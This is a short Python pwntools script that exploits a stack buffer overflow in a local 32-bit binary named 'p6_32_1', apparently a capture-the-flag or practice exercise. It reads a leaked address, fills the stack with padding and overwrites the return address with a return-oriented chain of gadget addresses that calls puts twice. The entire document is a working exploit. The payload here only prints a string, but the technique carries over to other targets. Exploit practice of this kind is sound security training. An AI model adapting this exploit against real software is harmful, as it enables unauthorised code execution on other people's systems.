from pwn import *

#context.log_level = "DEBUG"

ret = 0x80481a4
popret = 0x8048391
pop2ret = 0x80486ca
pop4ret = 0x80486c8
pop3ret = 0x80486c9
addesp_12 = 0x804838e
addesp_16 = 0x8048495

puts_plt = 0x080483e0
string = 0x8048759 # "echo 'Successful'"

p = process("./p6_32_1")

p.recvuntil("0x")
leak = int(p.recvline()[:-1],16)
print "leak = 0x%x" % leak

p.sendlineafter(" : ", "aaaa")
p.sendlineafter(" : ", "bbbb")

payload = "Hello World\x00"
payload += "a"*(0x6c+4 - len(payload))
payload += p32(puts_plt)
payload += p32(popret)
payload += p32(string)
payload += p32(puts_plt)
payload += p32(0xdeadbeef)
payload += p32(string)

p.sendafter("nicname\n", payload)

p.interactive()
